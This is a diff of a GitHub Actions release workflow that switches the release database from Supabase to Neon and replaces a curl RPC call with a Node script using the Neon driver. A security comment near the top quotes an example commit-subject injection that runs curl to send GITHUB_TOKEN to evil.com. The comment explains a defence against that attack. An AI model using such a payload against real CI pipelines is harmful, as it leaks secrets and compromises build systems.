@@ -156,7 +156,7 @@ jobs:
           # via ${{ ... }} interpolation in the script body. Commit subjects flow
           # into this string from `git log` and an attacker could craft
           # `feat: x ${require('child_process').execSync('curl evil.com?t='+process.env.GITHUB_TOKEN)}`
-          # which would execute on the runner with secrets exposed (TAURI_*, SUPABASE_*, APPLE_*).
+          # which would execute on the runner with secrets exposed (TAURI_*, NEON_*, APPLE_*).
           # Reading from process.env keeps the value as a plain string — JS template
           # literal evaluation only happens against the literal text we author below.
           CHANGELOG: ${{ steps.changelog.outputs.changelog }}
@@ -341,7 +341,7 @@ jobs:
           retention-days: 7
 
   # ==========================================================================
-  # Update Release Database - Store release info in Supabase
+  # Update Release Database - Store release info in Neon
   # ==========================================================================
   update-database:
     name: Update Release Database
@@ -363,12 +363,14 @@ jobs:
 
       - name: Mask sensitive secrets
         run: |
-          echo "::add-mask::${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}"
+          echo "::add-mask::${{ secrets.NEON_DATABASE_URL }}"
+
+      - name: Install Neon database driver
+        run: npm install --no-save @neondatabase/serverless@1.1.0
 
       - name: Update release database
         env:
-          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
-          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          NEON_DATABASE_URL: ${{ secrets.NEON_DATABASE_URL }}
           VERSION: ${{ needs.prepare-release.outputs.version }}
           CHANNEL: ${{ needs.prepare-release.outputs.channel }}
           PRERELEASE: ${{ needs.prepare-release.outputs.prerelease }}
@@ -378,31 +380,39 @@ jobs:
           BASE_URL="https://github.com/${GITHUB_REPO}/releases/download/v${VERSION}"
           IS_PRERELEASE=$( [ "${PRERELEASE}" = "true" ] && echo "true" || echo "false" )
 
-          # Call Supabase RPC endpoint directly via curl (no npm install needed)
+          # Call the Neon-backed release RPC through the serverless Postgres driver.
           upsert_release() {
             local platform="$1" download_url="$2" signature="$3" file_size="$4"
-            local response
-            response=$(curl -sf -X POST \
-              "${SUPABASE_URL}/rest/v1/rpc/upsert_release" \
-              -H "apikey: ${SUPABASE_SERVICE_ROLE_KEY}" \
-              -H "Authorization: Bearer ${SUPABASE_SERVICE_ROLE_KEY}" \
-              -H "Content-Type: application/json" \
-              -d "{
-                \"p_version\": \"${VERSION}\",
-                \"p_platform\": \"${platform}\",
-                \"p_download_url\": \"${download_url}\",
-                \"p_signature\": \"${signature}\",
-                \"p_notes\": null,
-                \"p_pub_date\": \"${PUB_DATE}\",
-                \"p_file_size_bytes\": ${file_size},
-                \"p_is_prerelease\": ${IS_PRERELEASE},
-                \"p_is_critical\": false,
-                \"p_channel\": \"${CHANNEL}\"
-              }")
+            node - "$platform" "$download_url" "$signature" "$file_size" "$PUB_DATE" "$IS_PRERELEASE" <<'NODE'
+          (async () => {
+          const { neon } = require('@neondatabase/serverless');
+          const [platform, downloadUrl, signature, fileSize, pubDate, isPrerelease] = process.argv.slice(2);
+          const sql = neon(process.env.NEON_DATABASE_URL);
+          await sql`
+            select public.upsert_release(
+              ${process.env.VERSION},
+              ${platform},
+              ${downloadUrl},
+              ${signature},
+              ${null},
+              ${pubDate},
+              ${Number(fileSize)},
+              ${null},
+              ${null},
+              ${isPrerelease === 'true'},
+              ${false},
+              ${process.env.CHANNEL}
+            )
+          `;
+          })().catch((error) => {
+            console.error(error);
+            process.exit(1);
+          });
+          NODE
             if [ $? -eq 0 ]; then
               echo "Updated release for ${platform}: ${VERSION}"
             else
-              echo "Failed to upsert release for ${platform}: ${response}" >&2
+              echo "Failed to upsert release for ${platform}" >&2
             fi
           }
 
